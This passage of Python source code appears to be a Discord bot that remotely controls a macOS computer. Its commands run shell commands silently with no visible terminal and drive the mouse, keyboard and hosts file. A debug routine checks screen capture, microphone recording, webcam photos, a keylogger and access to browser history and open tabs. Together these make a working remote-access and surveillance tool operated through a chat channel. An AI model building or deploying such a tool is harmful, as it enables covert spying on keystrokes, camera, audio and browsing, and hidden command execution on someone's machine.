            if "not found" in message.lower() or "not installed" in message.lower():
                error_response += f"\n\n💡 **Suggestions:**\n• Check if the application is installed\n• Try using the full application name\n• Use `/open applications` to browse installed apps"
            elif "does not exist" in message.lower():
                error_response += f"\n\n💡 **Suggestions:**\n• Check the file path spelling\n• Use `~/` for home directory\n• Try `/open documents` for common folders"
            
            await interaction.followup.send(error_response)
        
    except Exception as e:
        logger.error(f"Error in open command: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error opening target: {str(e)}")
            else:
                await interaction.followup.send(f"❌ Error opening target: {str(e)}")
        except Exception:
            pass

# Add a separate command for free text input
@bot.tree.command(name='open-custom', description='Open anything by typing the target freely (apps, URLs, files, etc.)')
@discord.app_commands.describe(
    target='What to open (app name, URL, file path, search query, etc.)',
    args='Optional arguments to pass to the application'
)
async def open_custom_command(interaction: discord.Interaction, target: str, args: str = None):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    
    try:
        await interaction.response.defer()
        
        # Execute the open command
        success, message = open_target(target, args)
        
        if success:
            response = f"✅ {message}"
            
            # Add type detection info
            if is_url(target):
                response += f"\n🌐 **Type**: Website/URL"
            elif target.startswith(('/', '~')):
                response += f"\n📁 **Type**: File/Folder"
            elif target.lower().startswith(('pref:', 'preference:', 'setting:')):
                response += f"\n⚙️ **Type**: System Preference"
            elif target.lower().startswith('search:'):
                response += f"\n🔍 **Type**: Google Search"
            else:
                response += f"\n📱 **Type**: Application"
            
            await interaction.followup.send(response)
        else:
            error_response = f"❌ {message}"
            
            # Add helpful examples
            error_response += f"\n\n💡 **Examples:**\n"
            error_response += f"• `spotify` - Open Spotify\n"
            error_response += f"• `github.com` - Open GitHub\n"
            error_response += f"• `~/Downloads` - Open Downloads folder\n"
            error_response += f"• `search: how to code` - Google search\n"
            error_response += f"• `pref: network` - Network settings"
            
            await interaction.followup.send(error_response)
        
    except Exception as e:
        logger.error(f"Error in open-custom command: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error opening target: {str(e)}")
            else:
                await interaction.followup.send(f"❌ Error opening target: {str(e)}")
        except Exception:
            pass

@bot.tree.command(name='cmd', description='Execute shell commands silently in background')
@discord.app_commands.describe(
    command='Shell command to execute (or use aliases like "sysinfo", "processes")',
    timeout='Timeout in seconds (default: 30, max: 300)',
    working_directory='Directory to run command in (use shortcuts: home, desktop, documents, downloads)'
)
async def cmd_command(interaction: discord.Interaction, command: str, timeout: int = 30, working_directory: str = None):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    
    try:
        await interaction.response.defer()
        
        # Validate timeout
        if timeout > 300:
            timeout = 300
        elif timeout < 1:
            timeout = 1
        
        # Resolve command aliases
        resolved_command = resolve_command_alias(command)
        
        # Validate command safety
        is_safe, safety_message = validate_command_safety(resolved_command)
        if not is_safe:
            await interaction.followup.send(f"🚫 **Command Blocked**\n\n{safety_message}\n\n💡 **Safe alternatives:**\n• Use built-in commands like `/sysinfo`, `/processes`\n• Avoid system modification commands\n• Check `/cmd-help` for safe command examples")
            return
        
        # Execute command
        result = execute_command_silent(resolved_command, timeout, working_directory)
        
        # Track in history
        track_command_history(
            resolved_command, 
            result['success'] and result['returncode'] == 0,
            result['duration'],
            result['returncode']
        )
        
        # Format and send response
        formatted_output = format_command_output(result)
        
        # Check if response is too long for Discord
        if len(formatted_output) > 1900:
            # Create file for large output
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"cmd_output_{timestamp}.txt"
            
            file_content = f"Command: {result['command']}\n"
            file_content += f"Directory: {result['cwd']}\n"
            file_content += f"Duration: {result['duration']:.2f}s\n"
            file_content += f"Exit Code: {result['returncode']}\n"
            file_content += "=" * 50 + "\n\n"
            
            if result['stdout']:
                file_content += "STDOUT:\n" + "=" * 20 + "\n"
                file_content += result['stdout'] + "\n\n"
            
            if result['stderr']:
                file_content += "STDERR:\n" + "=" * 20 + "\n"
                file_content += result['stderr'] + "\n"
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(file_content)
            
            # Send summary with file
            summary = f"{'✅' if result['success'] and result['returncode'] == 0 else '❌'} **Command {'executed successfully' if result['success'] and result['returncode'] == 0 else 'execution failed'}**\n\n"
            summary += f"📝 **Command**: `{result['command']}`\n"
            summary += f"📁 **Directory**: `{result['cwd']}`\n"
            summary += f"⏱️ **Duration**: {result['duration']:.2f}s\n"
            summary += f"📤 **Exit Code**: {result['returncode']}\n\n"
            summary += "📎 **Full output attached** (too large for Discord message)"
            
            await interaction.followup.send(summary, file=discord.File(filename))
            os.remove(filename)
        else:
            await interaction.followup.send(formatted_output)
        
    except Exception as e:
        logger.error(f"Error in cmd command: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error executing command: {str(e)}")
            else:
                await interaction.followup.send(f"❌ Error executing command: {str(e)}")
        except Exception:
            pass

@bot.tree.command(name='cmd-history', description='Show recent command execution history')
@discord.app_commands.describe(
    limit='Number of recent commands to show (default: 10, max: 20)'
)
async def cmd_history_command(interaction: discord.Interaction, limit: int = 10):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    
    try:
        global command_history
        
        if not command_history:
            await interaction.response.send_message("📜 **Command History Empty**\n\nNo commands have been executed yet. Use `/cmd` to run your first command!")
            return
        
        # Validate limit
        if limit > 20:
            limit = 20
        elif limit < 1:
            limit = 1
        
        # Get recent commands
        recent_commands = command_history[-limit:]
        
        # Format history
        response = f"📜 **Recent Command History** (last {len(recent_commands)} commands)\n\n"
        
        for i, entry in enumerate(reversed(recent_commands), 1):
            status_emoji = "✅" if entry['success'] else "❌"
            response += f"**{i}.** {status_emoji} `{entry['command'][:60]}{'...' if len(entry['command']) > 60 else ''}`\n"
            response += f"    🕐 {entry['timestamp']} | ⏱️ {entry['duration']:.2f}s | 📤 Exit: {entry['returncode']}\n\n"
        
        await interaction.response.send_message(response)
        
    except Exception as e:
        logger.error(f"Error in cmd-history command: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error retrieving command history: {str(e)}")
            else:
                await interaction.followup.send(f"❌ Error retrieving command history: {str(e)}")
        except Exception:
            pass

@bot.tree.command(name='cmd-help', description='Show help and examples for safe command usage')
async def cmd_help_command(interaction: discord.Interaction):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    
    try:
        help_text = """
🛠️ **Command Execution Help**

**Basic Usage:**
`/cmd "command here"`
`/cmd "ls -la" 60 ~/Documents`  (with timeout and directory)

**Built-in Aliases:**
• `sysinfo` - System hardware information
• `processes` - Running processes list
• `diskspace` - Disk usage information
• `memory` - Memory statistics
• `network` - Network routing table
• `listening` - Listening network ports
• `uptime` - System uptime
• `users` - Currently logged users
• `kernel` - Kernel version information
• `osversion` - macOS version details

**Safe Command Examples:**
• `ls -la ~/Desktop` - List desktop files
• `ps aux | head -20` - Show running processes
• `df -h` - Show disk space
• `netstat -an | grep LISTEN` - Show listening ports
• `find ~/Downloads -name "*.pdf"` - Find PDF files
• `cat ~/Desktop/file.txt` - Read text file
• `which python3` - Find command location
• `echo $PATH` - Show PATH variable
• `date` - Current date and time

**Working Directories:**
• `home` - Your home directory
• `desktop` - Desktop folder
• `documents` - Documents folder
• `downloads` - Downloads folder
• `~/path` - Any path starting with ~
• `/full/path` - Any absolute path

**Security Notes:**
• Sudo commands are blocked for safety
• System modification commands are blocked
• Dangerous file operations are prevented
• Commands timeout after specified seconds
• All executions run in background (no visible terminal)

**Tips:**
• Use quotes around commands with spaces
• Check `/cmd-history` to see recent executions
• Commands run silently without opening Terminal
• Large outputs are saved to files automatically
"""
        await interaction.response.send_message(help_text)
        
    except Exception as e:
        logger.error(f"Error in cmd-help command: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error displaying command help: {str(e)}")
            else:
                await interaction.followup.send(f"❌ Error displaying command help: {str(e)}")
        except Exception:
            pass

@bot.tree.command(name='debug', description='Test all system functions')
async def debug(interaction: discord.Interaction):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    await interaction.response.defer()
    results = []
    # ss test
    try:
        path = take_screenshot()
        results.append('🟢 Screenshot: OK')
        os.remove(path)
    except Exception as e:
        tb = traceback.format_exc()
        results.append(f'🔴 Screenshot: FAIL\n{str(e)}\n```{tb}```')
    # audio test
    try:
        path = record_audio(duration=1)
        results.append('🟢 Audio Recording: OK')
        os.remove(path)
    except Exception as e:
        tb = traceback.format_exc()
        results.append(f'🔴 Audio Recording: FAIL\n{str(e)}\n```{tb}```')
    # cam test
    try:
        path = take_webcam_photo()
        if path:
            results.append('🟢 Camera: OK')
            os.remove(path)
        else:
            results.append('🔴 Camera: FAIL\nNo photo captured (device not found or permission denied)')
    except Exception as e:
        tb = traceback.format_exc()
        results.append(f'🔴 Camera: FAIL\n{str(e)}\n```{tb}```')
    # sys info test
    try:
        info = get_system_info()
        results.append('🟢 System Info: OK')
    except Exception as e:
        tb = traceback.format_exc()
        results.append(f'🔴 System Info: FAIL\n{str(e)}\n```{tb}```')
    # Keylogger test (jst checking import, listener)
    try:
        from pynput import keyboard
        results.append('🟢 Keylogger: OK (import)')
    except Exception as e:
        tb = traceback.format_exc()
        results.append(f'🔴 Keylogger: FAIL\n{str(e)}\n```{tb}```')
    # Browser detection test
    try:
        browsers = get_running_browsers()
        if browsers:
            results.append(f'🟢 Browser Detection: OK ({len(browsers)} running: {", ".join(browsers)})')
        else:
            results.append('🟡 Browser Detection: OK (no browsers running)')
    except Exception as e:
        results.append(f'🔴 Browser Detection: FAIL\n{str(e)}')
    # Active tab test
    try:
        active_info = get_active_website_info()
        if active_info:
            results.append(f'🟢 Active Tab Detection: OK ({active_info["browser"]})')
        else:
            results.append('🟡 Active Tab Detection: OK (no active tabs)')
    except Exception as e:
        results.append(f'🔴 Active Tab Detection: FAIL\n{str(e)}')
    # Browser history test
    try:
        history = get_browser_history("all", 1, 1)  # Test with minimal parameters
        if history:
            results.append(f'🟢 Browser History Access: OK ({len(history)} entries found)')
        else:
            results.append('🟡 Browser History Access: OK (no history found - may need Full Disk Access)')
    except Exception as e:
        results.append(f'🔴 Browser History Access: FAIL\n{str(e)}')
    # Open functionality test
    try:
        # Test basic target validation and app name resolution
        test_apps = ['calculator', 'nonexistentapp12345']
        working_apps = []
        for app in test_apps:
            resolved = resolve_app_name(app)
            if resolved != app:  # App was resolved from alias
                working_apps.append(f"{app} → {resolved}")
        
        if working_apps:
            results.append(f'🟢 Open Functionality: OK (App resolution working)')
        else:
            results.append('🟡 Open Functionality: OK (Basic validation working)')
    except Exception as e:
        results.append(f'🔴 Open Functionality: FAIL\n{str(e)}')
    # PyAutoGUI test
    try:
        # Test screen size detection and basic validation
        screen_size = get_screen_size()
        if screen_size:
            width, height = screen_size
            results.append(f'🟢 PyAutoGUI: OK (Screen size: {width}x{height}, failsafe enabled)')
        else:
            results.append('🔴 PyAutoGUI: FAIL (Could not get screen size)')
    except Exception as e:
        results.append(f'🔴 PyAutoGUI: FAIL\n{str(e)}')
    # Scroll functionality test
    try:
        # Test scroll validation without actually scrolling
        screen_size = get_screen_size()
        if screen_size:
            width, height = screen_size
            # Test coordinate validation logic without actually scrolling
            test_x, test_y = width // 2, height // 2  # Use center of screen
            if (0 <= test_x < width and 0 <= test_y < height and 
                1 <= 5 <= 20 and 'up' in ['up', 'down']):  # Test validation logic
                results.append('🟢 Scroll Function: OK (Validation logic working)')
            else:
                results.append('🟡 Scroll Function: OK (Basic validation available)')
        else:
            results.append('🟡 Scroll Function: Limited (Cannot determine screen size)')
    except Exception as e:
        results.append(f'🔴 Scroll Function: FAIL\n{str(e)}')
    # Hotkey functionality test
    try:
        # Test hotkey parsing and validation without executing
        test_keys = ['command+c', 'ctrl+alt+t', 'fn+f3']
        working_keys = []
        for key_combo in test_keys:
            # Test key parsing only (don't execute)
            keys = [key.strip().lower() for key in key_combo.split('+')]
            key_aliases = {'cmd': 'command', 'control': 'ctrl', 'option': 'alt', 'meta': 'command'}
            resolved_keys = [key_aliases.get(key, key) for key in keys]
            
            # Check if all keys are valid
            if all(key in pyautogui.KEYBOARD_KEYS for key in resolved_keys):
                working_keys.append(key_combo)
        
        if working_keys:
            results.append(f'🟢 Shortcut Function: OK (Key validation working for {len(working_keys)}/{len(test_keys)} test cases)')
        else:
            results.append('🟡 Shortcut Function: OK (Basic function available)')
    except Exception as e:
        results.append(f'🔴 Shortcut Function: FAIL\n{str(e)}')
    # Command execution test
    try:
        # Test command validation and alias resolution
        test_result = validate_command_safety("ls -la")
        alias_result = resolve_command_alias("sysinfo")
        
        if test_result[0] and alias_result != "sysinfo":
            results.append('🟢 Command Execution: OK (Validation and aliases working)')
        else:
            results.append('🟡 Command Execution: OK (Basic functions working)')
    except Exception as e:
        results.append(f'🔴 Command Execution: FAIL\n{str(e)}')
    # Website blocking test
    try:
        # Test domain validation without actually blocking anything
        test_domains = ['example.com', 'invalid-domain', 'apple.com']
        validation_results = []
        
        for domain in test_domains:
            is_valid, message, clean_domain = validate_domain(domain)
            if domain == 'example.com' and is_valid:
                validation_results.append('✓ Valid domain detection')
            elif domain == 'invalid-domain' and not is_valid:
                validation_results.append('✓ Invalid domain rejection') 
            elif domain == 'apple.com' and not is_valid and 'critical' in message.lower():
                validation_results.append('✓ Critical domain protection')
        
        # Test hosts file access (read only)
        try:
            success, blocked_domains = list_blocked_websites()
            if success:
                validation_results.append(f'✓ Hosts file access (found {len(blocked_domains)} entries)')
            else:
                validation_results.append('⚠ Hosts file read limited')
        except:
            validation_results.append('⚠ Hosts file access requires admin')
        
        if len(validation_results) >= 3:
            results.append(f'🟢 Website Blocking: OK ({len(validation_results)} validations passed)')
        else:
            results.append(f'🟡 Website Blocking: Partial ({len(validation_results)} validations passed)')
            
    except Exception as e:
        results.append(f'🔴 Website Blocking: FAIL\n{str(e)}')
    await interaction.followup.send('\n'.join(results))

@bot.tree.command(name='scroll', description='Scroll mouse wheel at coordinates or current position')
@discord.app_commands.describe(
    clicks='Number of scroll clicks (1-20)',
    direction='Scroll direction',
    x='X coordinate (optional, uses current position if not specified)',
    y='Y coordinate (optional, uses current position if not specified)'
)
@discord.app_commands.choices(direction=[
    discord.app_commands.Choice(name='Scroll Up', value='up'),
    discord.app_commands.Choice(name='Scroll Down', value='down')
])
async def scroll_command(interaction: discord.Interaction, clicks: int, direction: discord.app_commands.Choice[str], x: int = None, y: int = None):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    
    try:
        await interaction.response.defer()
        
        # Handle direction parameter (could be Choice object or string)
        direction_value = direction.value if hasattr(direction, 'value') else direction
        
        success, message = scroll_at_coordinates(x, y, clicks, direction_value)
        
        if success:
            await interaction.followup.send(f"📜 {message}")
        else:
            await interaction.followup.send(f"❌ {message}")
            
    except Exception as e:
        logger.error(f"Error in scroll command: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error scrolling: {str(e)}")
            else:
                await interaction.followup.send(f"❌ Error scrolling: {str(e)}")
        except Exception:
            pass

@bot.tree.command(name='shortcut', description='Execute keyboard shortcuts - use + to separate keys (e.g., command+c, fn+f3, shift+tab)')
@discord.app_commands.describe(
    keys='Keys separated by + (examples: command+c, ctrl+shift+t, fn+f3, alt+tab)'
)
async def shortcut_command(interaction: discord.Interaction, keys: str):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    
    try:
        await interaction.response.defer()
        
        success, message = execute_hotkey(keys)
        
        if success:
            await interaction.followup.send(f"⌨️ {message}")
        else:
            await interaction.followup.send(f"❌ {message}")
            
    except Exception as e:
        logger.error(f"Error in shortcut command: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error executing shortcut: {str(e)}")
            else:
                await interaction.followup.send(f"❌ Error executing shortcut: {str(e)}")
        except Exception:
            pass

@bot.tree.command(name='click', description='Click at screen coordinates with mouse button (supports long clicks)')
@discord.app_commands.describe(
    x='X coordinate on screen',
    y='Y coordinate on screen', 
    button='Mouse button to use',
    clicks='Number of clicks (1-10)',
    hold_duration='Hold duration in seconds (0-10, default 0 for normal click)'
)
@discord.app_commands.choices(button=[
    discord.app_commands.Choice(name='Left Click', value='left'),
    discord.app_commands.Choice(name='Right Click', value='right'),
    discord.app_commands.Choice(name='Middle Click', value='middle')
])
async def click_command(interaction: discord.Interaction, x: int, y: int, button: discord.app_commands.Choice[str] = 'left', clicks: int = 1, hold_duration: float = 0.0):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    
    try:
        await interaction.response.defer()
        
        # Handle button parameter (could be Choice object or string)
        button_value = button.value if hasattr(button, 'value') else button
        
        success, message = click_at_coordinates(x, y, button_value, clicks, hold_duration)
        
        if success:
            await interaction.followup.send(f"🖱️ {message}")
        else:
            await interaction.followup.send(f"❌ {message}")
            
    except Exception as e:
        logger.error(f"Error in click command: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error clicking: {str(e)}")
            else:
                await interaction.followup.send(f"❌ Error clicking: {str(e)}")
        except Exception:
            pass

@bot.tree.command(name='type', description='Type text with support for special keys (\\n for Enter, \\t for Tab)')
@discord.app_commands.describe(
    text='Text to type (use \\n for Enter key, \\t for Tab key, max 1000 chars)'
)
async def type_command(interaction: discord.Interaction, text: str):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    
    try:
        await interaction.response.defer()
        
        success, message = type_text(text)
        
        if success:
            await interaction.followup.send(f"⌨️ {message}")
        else:
            await interaction.followup.send(f"❌ {message}")
            
    except Exception as e:
        logger.error(f"Error in type command: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error typing: {str(e)}")
            else:
                await interaction.followup.send(f"❌ Error typing: {str(e)}")
        except Exception:
            pass

@bot.tree.command(name='block', description='Website blocking and filtering management')
@discord.app_commands.describe(
    action='Action to perform',
    domain='Domain name (required for block/unblock actions)',
    confirm='Confirmation for clear action (type "yes" to confirm)'
)
@discord.app_commands.choices(action=[
    discord.app_commands.Choice(name='🚫 Block Website', value='block'),
    discord.app_commands.Choice(name='✅ Unblock Website', value='unblock'),
    discord.app_commands.Choice(name='📋 List Blocked', value='list'),
    discord.app_commands.Choice(name='🗑️ Clear All', value='clear')
])
async def block_command(interaction: discord.Interaction, action: discord.app_commands.Choice[str], domain: str = None, confirm: str = "no"):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    
    # Check user authorization
    if not is_user_authorized_for_blocking(interaction.user.id):
        await interaction.response.send_message("❌ You are not authorized to use website blocking commands.")
        return
    
    action_value = action.value
    
    try:
        # Handle different actions
        if action_value == 'block':
            if not domain:
                await interaction.response.send_message("❌ Domain parameter is required for blocking action.\n**Usage:** `/block action:🚫 Block Website domain:example.com`")
                return
                
            await interaction.response.defer()
            success, message = block_website(domain)
            
            if success:
                await interaction.followup.send(f"🚫 {message}")
            else:
                await interaction.followup.send(f"❌ {message}")
                
        elif action_value == 'unblock':
            if not domain:
                await interaction.response.send_message("❌ Domain parameter is required for unblocking action.\n**Usage:** `/block action:✅ Unblock Website domain:example.com`")
                return
                
            await interaction.response.defer()
            success, message = unblock_website(domain)
            
            if success:
                await interaction.followup.send(f"✅ {message}")
            else:
                await interaction.followup.send(f"❌ {message}")
                
        elif action_value == 'list':
            await interaction.response.defer()
            success, result = list_blocked_websites()
            
            if success:
                if result:
                    blocked_list = "\n".join([f"• {domain}" for domain in result])
                    await interaction.followup.send(f"🚫 **Currently Blocked Websites** ({len(result)}):\n```\n{blocked_list}\n```")
                else:
                    await interaction.followup.send("✅ No websites are currently blocked.")
            else:
                await interaction.followup.send(f"❌ {result}")
                
        elif action_value == 'clear':
            if confirm.lower() != "yes":
                await interaction.response.send_message("⚠️ This will remove ALL website blocks. To confirm, use:\n`/block action:🗑️ Clear All confirm:yes`")
                return
                
            await interaction.response.defer()
            success, message = clear_all_blocked_websites()
            
            if success:
                await interaction.followup.send(f"✅ {message}")
            else:
                await interaction.followup.send(f"❌ {message}")
        
    except Exception as e:
        logger.error(f"Error in block command ({action_value}): {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error in {action_value} action: {str(e)}")
            else:
                await interaction.followup.send(f"❌ Error in {action_value} action: {str(e)}")
        except Exception:
            pass

# run the bot
logger.info('Starting bot...')
bot.run(TOKEN) 